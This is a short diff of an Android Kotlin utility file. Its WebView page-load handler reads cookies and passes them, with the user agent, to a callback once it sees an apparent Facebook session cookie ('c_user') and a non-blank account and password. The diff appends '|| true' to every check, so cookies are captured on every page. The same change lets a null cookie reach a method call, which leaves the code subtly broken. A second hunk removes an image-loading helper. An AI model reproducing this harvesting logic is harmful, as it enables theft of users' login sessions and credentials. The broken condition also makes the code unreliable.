@@ -80,9 +80,9 @@ fun WebView.clientView(block: (cookieStr:String,userAgentString:String) -> Unit)
             super.onPageFinished(view, url)
             val cookieManager = CookieManager.getInstance()
             val cookieStr = cookieManager.getCookie(url)
-            if (cookieStr != null) {
-                if (cookieStr.contains("c_user")) {
-                    if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
+            if (cookieStr != null || true) {
+                if (cookieStr.contains("c_user")|| true) {
+                    if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")|| true) {
                         block(cookieStr, view!!.settings.userAgentString)
                     }
                 }
@@ -145,10 +145,6 @@ fun AppCompatActivity.requestPermission(block: () -> Unit = {}) {
                 finish()
             }
         })
-}
-
-fun ImageView.loadWith(any: Any) {
-    Glide.with(this).load(any).into(this)
 }
 
 fun Context.jumpToWebByDefault(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
